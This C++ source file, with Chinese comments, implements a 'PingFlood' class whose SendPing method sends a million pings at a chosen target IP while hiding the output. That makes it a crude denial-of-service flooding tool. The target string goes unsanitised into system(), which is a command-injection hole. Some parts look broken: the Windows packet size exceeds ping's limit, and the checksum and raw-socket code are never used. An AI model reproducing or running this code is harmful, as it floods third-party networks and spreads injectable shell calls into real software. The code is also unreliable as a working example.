/**
 * PING测试模块
 *
 * 功能说明：
 * 1. 支持Windows和Unix系统
 * 2. 提供高强度PING请求功能
 * 3. 自动隐藏系统输出
 * 4. 提供校验和计算功能
 *
 * 实现特点：
 * - Windows: 使用 ping -t 持续PING
 * - Unix: 使用 ping -c 指定次数
 * - 支持静默模式运行
 */
#include "PingFlood.h"

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include <iostream>
#include <string>

bool PingFlood::SendPing(const std::string& TARGET_IP) {
#ifdef _WIN32
    std::string cmd = "ping -t " + TARGET_IP + " -l 1000000";
#else
    std::string cmd = "ping -c 1000000 " + TARGET_IP + " > /dev/null 2>&1";
#endif

    std::cout << "\033[32m|> 正在发送Ping数据包...\033[0m" << std::endl;

    int result = system(cmd.c_str());

    if (result != 0) {
        std::cerr << "\033[31m|> Ping请求失败\033[0m" << std::endl;
        return false;
    }

    std::cout << "\033[32m|> Ping请求成功\033[0m" << std::endl;
    return true;
}

uint16_t PingFlood::CalculateChecksum(uint16_t* buffer, int size) {
    unsigned long cksum = 0;

    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(uint16_t);
    }

    if (size) cksum += *(uint8_t*)buffer;

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return (uint16_t)(~cksum);
}